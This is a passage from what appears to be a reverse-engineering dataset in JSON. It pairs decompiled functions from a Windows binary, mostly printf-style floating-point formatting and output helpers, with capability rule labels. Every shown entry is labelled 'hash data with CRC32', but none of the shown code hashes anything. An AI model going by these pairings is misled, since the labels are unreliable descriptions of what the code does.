fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar5 + 0xc);\n    }\n    if (((*(param_1 + 0x2d) == 'g') || (*(param_1 + 0x2d) == 'G')) && ((param_1[7] >> 5 & 1) == 0)) {\n        iVar5 = param_1[2];\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447b34(param_1[0xc], iVar5 + 0xc);\n    }\n    pcVar4 = param_1[0xc];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xc] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        *(param_1 + 0x2d) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xd] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1079
    },
    "004511d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004511d0(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar7 = param_1[9];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x2e) == 0x61) || (*(param_1 + 0x2e) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[9] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x2e) == 0x67 || (*(param_1 + 0x2e) == 0x47)))) {\n        param_1[9] = 1;\n        iVar7 = 1;\n    }\n    cVar3 = fcn.0043d5b0(iVar7 + 0x15d, param_1[2]);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.0043d565();\n        iVar7 = iVar7 + -0x15d;\n        param_1[9] = iVar7;\n    }\n    else {\n        iVar7 = param_1[9];\n    }\n    puVar4 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar4 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar4;\n    puVar4 = param_1[4];\n    param_1[4] = puVar4 + 2;\n    var_14h = *puVar4;\n    var_10h = puVar4[1];\n    var_4h = *(param_1 + 0x2e);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar4 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar4 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar4, arg_10h, var_ch, var_8h, var_4h, iVar7, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar7 + 0xc);\n    }\n    uVar2 = *(param_1 + 0x2e);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[7] >> 5,  (uVar5 & 1) == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        uVar5 = fcn.00447b34(param_1[0xc], iVar7 + 0xc);\n    }\n    pcVar6 = param_1[0xc];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xc] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x2e) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xd] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1160
    },
    "00451377": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451377(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    cVar2 = fcn.00454b51();\n    if (cVar2 == '\\0') {\ncode_r0x00451534:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.0044ac3e();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[9];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x2e) == 0x61) || (*(param_1 + 0x2e) == 0x41)) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[9] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x2e) == 0x67 || (*(param_1 + 0x2e) == 0x47)))) {\n                param_1[9] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.0043d5b0(iVar6 + 0x15d, param_1[2]);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.0043d565();\n                param_1[9] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x110];\n            if (param_1[0x110] == NULL) {\n                puVar3 = param_1 + 0xf;\n            }\n            var_10h = 0;\n            var_ch = 0;\n            param_1[0xc] = puVar3;\n            cVar2 = fcn.0043f293(&var_10h);\n            if (cVar2 == '\\0') goto code_r0x00451534;\n            cVar2 = *(param_1 + 0x2e);\n            var_4h = fcn.0043d565();\n            var_8h = fcn.00440a8f();\n            uVar4 = fcn.0043d565();\n            puVar3 = param_1 + 0xf;\n            if (param_1[0x110] != NULL) {\n                puVar3 = param_1[0x110];\n            }\n            fcn.0045e9cc(&var_10h, puVar3, uVar4, var_8h, var_4h, cVar2, param_1[9], *param_1, param_1[1], 1, param_1[2]\n                        );\n            if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447e6c(param_1[0xc], iVar6 + 0xc);\n            }\n            if (((*(param_1 + 0x2e) == 0x67) || (*(param_1 + 0x2e) == 0x47)) && ((param_1[7] >> 5 & 1) == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447b34(param_1[0xc], iVar6 + 0xc);\n            }\n            pcVar5 = param_1[0xc];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[7] = param_1[7] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xc] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[7] = param_1[7] & 0xfffffff7;\n                *(param_1 + 0x2e) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xd] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1148
    },
    "0045153b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045153b(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar7 = param_1[9];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x2e) == 0x61) || (*(param_1 + 0x2e) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[9] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x2e) == 0x67 || (*(param_1 + 0x2e) == 0x47)))) {\n        param_1[9] = 1;\n        iVar7 = 1;\n    }\n    cVar3 = fcn.0043d5b0(iVar7 + 0x15d, param_1[2]);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.0043d565();\n        iVar7 = iVar7 + -0x15d;\n        param_1[9] = iVar7;\n    }\n    else {\n        iVar7 = param_1[9];\n    }\n    puVar4 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar4 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar4;\n    puVar4 = param_1[4];\n    param_1[4] = puVar4 + 2;\n    var_14h = *puVar4;\n    var_10h = puVar4[1];\n    var_4h = *(param_1 + 0x2e);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar4 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar4 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar4, arg_10h, var_ch, var_8h, var_4h, iVar7, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar7 + 0xc);\n    }\n    uVar2 = *(param_1 + 0x2e);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[7] >> 5,  (uVar5 & 1) == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        uVar5 = fcn.00447b34(param_1[0xc], iVar7 + 0xc);\n    }\n    pcVar6 = param_1[0xc];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xc] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x2e) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xd] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1160
    },
    "004516e2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004516e2(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar7 = param_1[9];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x2e) == 0x61) || (*(param_1 + 0x2e) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[9] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x2e) == 0x67 || (*(param_1 + 0x2e) == 0x47)))) {\n        param_1[9] = 1;\n        iVar7 = 1;\n    }\n    cVar3 = fcn.0043d5b0(iVar7 + 0x15d, param_1[2]);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.0043d565();\n        iVar7 = iVar7 + -0x15d;\n        param_1[9] = iVar7;\n    }\n    else {\n        iVar7 = param_1[9];\n    }\n    puVar4 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar4 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar4;\n    puVar4 = param_1[4];\n    param_1[4] = puVar4 + 2;\n    var_14h = *puVar4;\n    var_10h = puVar4[1];\n    var_4h = *(param_1 + 0x2e);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar4 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar4 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar4, arg_10h, var_ch, var_8h, var_4h, iVar7, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar7 + 0xc);\n    }\n    uVar2 = *(param_1 + 0x2e);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[7] >> 5,  (uVar5 & 1) == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        uVar5 = fcn.00447b34(param_1[0xc], iVar7 + 0xc);\n    }\n    pcVar6 = param_1[0xc];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xc] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x2e) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xd] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1160
    },
    "00451889": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451889(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    cVar2 = fcn.00454bb0();\n    if (cVar2 == '\\0') {\ncode_r0x00451a46:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.0044ac54();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[9];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x2e) == 0x61) || (*(param_1 + 0x2e) == 0x41)) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[9] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x2e) == 0x67 || (*(param_1 + 0x2e) == 0x47)))) {\n                param_1[9] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.0043d5b0(iVar6 + 0x15d, param_1[2]);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.0043d565();\n                param_1[9] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x110];\n            if (param_1[0x110] == NULL) {\n                puVar3 = param_1 + 0xf;\n            }\n            var_10h = 0;\n            var_ch = 0;\n            param_1[0xc] = puVar3;\n            cVar2 = fcn.0043f32a(&var_10h);\n            if (cVar2 == '\\0') goto code_r0x00451a46;\n            cVar2 = *(param_1 + 0x2e);\n            var_4h = fcn.0043d565();\n            var_8h = fcn.00440a8f();\n            uVar4 = fcn.0043d565();\n            puVar3 = param_1 + 0xf;\n            if (param_1[0x110] != NULL) {\n                puVar3 = param_1[0x110];\n            }\n            fcn.0045e9cc(&var_10h, puVar3, uVar4, var_8h, var_4h, cVar2, param_1[9], *param_1, param_1[1], 1, param_1[2]\n                        );\n            if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447e6c(param_1[0xc], iVar6 + 0xc);\n            }\n            if (((*(param_1 + 0x2e) == 0x67) || (*(param_1 + 0x2e) == 0x47)) && ((param_1[7] >> 5 & 1) == 0)) {\n                iVar6 = param_1[2];\n                if (*(iVar6 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                fcn.00447b34(param_1[0xc], iVar6 + 0xc);\n            }\n            pcVar5 = param_1[0xc];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[7] = param_1[7] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xc] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[7] = param_1[7] & 0xfffffff7;\n                *(param_1 + 0x2e) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xd] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1150
    },
    "00451a4d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00451a4d(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    param_1[7] = param_1[7] | 0x10;\n    iVar7 = param_1[9];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x2e) == 0x61) || (*(param_1 + 0x2e) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[9] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x2e) == 0x67 || (*(param_1 + 0x2e) == 0x47)))) {\n        param_1[9] = 1;\n        iVar7 = 1;\n    }\n    cVar3 = fcn.0043d5b0(iVar7 + 0x15d, param_1[2]);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.0043d565();\n        iVar7 = iVar7 + -0x15d;\n        param_1[9] = iVar7;\n    }\n    else {\n        iVar7 = param_1[9];\n    }\n    puVar4 = param_1[0x110];\n    if (param_1[0x110] == NULL) {\n        puVar4 = param_1 + 0xf;\n    }\n    param_1[0xc] = puVar4;\n    puVar4 = param_1[4];\n    param_1[4] = puVar4 + 2;\n    var_14h = *puVar4;\n    var_10h = puVar4[1];\n    var_4h = *(param_1 + 0x2e);\n    var_8h = fcn.0043d565();\n    var_ch = fcn.00440a8f();\n    arg_10h = fcn.0043d565();\n    puVar4 = param_1 + 0xf;\n    if (param_1[0x110] != NULL) {\n        puVar4 = param_1[0x110];\n    }\n    fcn.0045e9cc(&var_14h, puVar4, arg_10h, var_ch, var_8h, var_4h, iVar7, *param_1, param_1[1], 1, param_1[2]);\n    if (((param_1[7] >> 5 & 1) != 0) && (param_1[9] == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        fcn.00447e6c(param_1[0xc], iVar7 + 0xc);\n    }\n    uVar2 = *(param_1 + 0x2e);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[7] >> 5,  (uVar5 & 1) == 0)) {\n        iVar7 = param_1[2];\n        if (*(iVar7 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        uVar5 = fcn.00447b34(param_1[0xc], iVar7 + 0xc);\n    }\n    pcVar6 = param_1[0xc];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[7] = param_1[7] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xc] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[7] = param_1[7] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x2e) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xd] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1161
    },
    "00452bc8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452bc8(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00440aad(0);\n    return;\n}\n",
        "token_count": 91
    },
    "00452be5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452be5(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00440c3a(0);\n    return;\n}\n",
        "token_count": 93
    },
    "00452c02": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c02(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00440dd6(0);\n    return;\n}\n",
        "token_count": 92
    },
    "00452c1f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c1f(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00440f63(0);\n    return;\n}\n",
        "token_count": 93
    },
    "00452c3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c3c(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.004410f0(0);\n    return;\n}\n",
        "token_count": 93
    },
    "00452c59": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c59(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.0044128c(0);\n    return;\n}\n",
        "token_count": 92
    },
    "00452c76": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c76(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00441419(0);\n    return;\n}\n",
        "token_count": 91
    },
    "00452c93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452c93(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.004415ab(0);\n    return;\n}\n",
        "token_count": 91
    },
    "00452cb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452cb0(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.0044174b(0);\n    return;\n}\n",
        "token_count": 92
    },
    "00452ccd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452ccd(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.004418dd(0);\n    return;\n}\n",
        "token_count": 90
    },
    "00452cea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452cea(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00441a6f(0);\n    return;\n}\n",
        "token_count": 92
    },
    "00452d07": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452d07(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.00441c0f(0);\n    return;\n}\n",
        "token_count": 93
    },
    "00454f59": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00454f59(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) == 0) || (*(*in_ECX + 4) != 0)) {\n        uVar1 = fcn.0045f5ff(arg_8h, *in_ECX, arg_ch);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n    }\n    else {\n        uVar1 = CONCAT31(*in_ECX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 162
    },
    "00454f93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00454f93(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) == 0) || (*(*in_ECX + 4) != 0)) {\n        uVar1 = fcn.0045f2ee(arg_8h, *in_ECX, arg_ch);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != -1;\n    }\n    else {\n        uVar1 = CONCAT31(*in_ECX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 161
    },
    "00455870": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455870(uint8_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    uint8_t *puVar4;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) != 0) && (*(*in_ECX + 4) == 0)) {\n        *arg_10h = *arg_10h + arg_ch;\n        return;\n    }\n    uVar1 = *(arg_14h + 0x18);\n    uVar2 = *(arg_14h + 0x1c);\n    puVar4 = arg_8h + arg_ch;\n    if (arg_8h != puVar4) {\n        do {\n            cVar3 = fcn.00454f59(*arg_8h, arg_14h);\n            if (cVar3 == '\\0') {\n                if ((*(arg_14h + 0x1c) == '\\0') || (*(arg_14h + 0x18) != 0x2a)) {\n                    *arg_10h = -1;\n                    break;\n                }\n                cVar3 = fcn.00454f59(0x3f, arg_14h);\n                if (cVar3 != '\\0') goto code_r0x004559f7;\n                *arg_10h = -1;\n            }\n            else {\ncode_r0x004559f7:\n                *arg_10h = *arg_10h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != puVar4);\n    }\n    *(arg_14h + 0x18) = uVar1;\n    *(arg_14h + 0x1c) = uVar2;\n    return;\n}\n",
        "token_count": 470
    },
    "0045589c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
